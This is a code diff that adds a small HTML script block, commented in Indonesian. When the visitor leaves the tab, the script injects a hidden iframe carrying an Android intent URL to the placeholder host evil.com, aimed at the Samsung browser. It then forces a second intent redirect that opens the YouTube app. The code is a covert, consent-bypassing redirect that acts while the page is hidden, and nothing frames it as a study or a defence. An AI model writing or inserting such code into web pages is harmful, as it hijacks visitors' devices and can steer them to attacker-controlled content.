@@ -1,0 +1,17 @@
+<script>
+document.addEventListener("visibilitychange", function() {
+    if (document.hidden) {
+        setTimeout(() => {
+            let iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'intent://evil.com/#Intent;scheme=https;package=com.sec.android.app.sbrowser;end;';
+            document.body.appendChild(iframe);
+            
+            setTimeout(() => {
+                window.location.href = 'intent://www.youtube.com/watch?v=dQw4w9WgXcQ#Intent;package=com.google.android.youtube;scheme=https;end;';
+            }, 3000); // Ganti 3000 dengan waktu delay yang diinginkan (dalam milidetik)
+            
+        }, 1000);
+    }
+});
+</script>
